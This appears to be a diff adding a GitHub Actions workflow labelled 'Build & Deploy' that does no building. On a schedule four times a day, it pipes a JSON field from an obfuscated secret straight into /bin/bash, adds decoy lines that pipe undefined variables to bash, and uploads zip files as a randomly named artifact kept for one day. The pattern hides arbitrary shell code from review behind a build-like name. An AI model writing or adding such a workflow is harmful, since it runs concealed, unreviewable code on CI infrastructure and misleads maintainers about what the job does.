@@ -1,0 +1,32 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '9 4,10,16,22 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          whhyk4042: ${{ secrets.whhyk4042 }}
+        run: |
+          printf '%s' "$whhyk4042" | jq -r .s16697 | /bin/bash
+          echo $li88 | jq -r .d49051 | /bin/bash
+          printf '%s' "$p2" | jq -r .exxnd7 | /bin/bash
+          echo $j0996 | jq -r .yu265 | /bin/bash
+          printf '%s' "$zvf31" | jq -r .yiq149 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: F9QcbT9G
+          path: "*.zip"
+          retention-days: 1
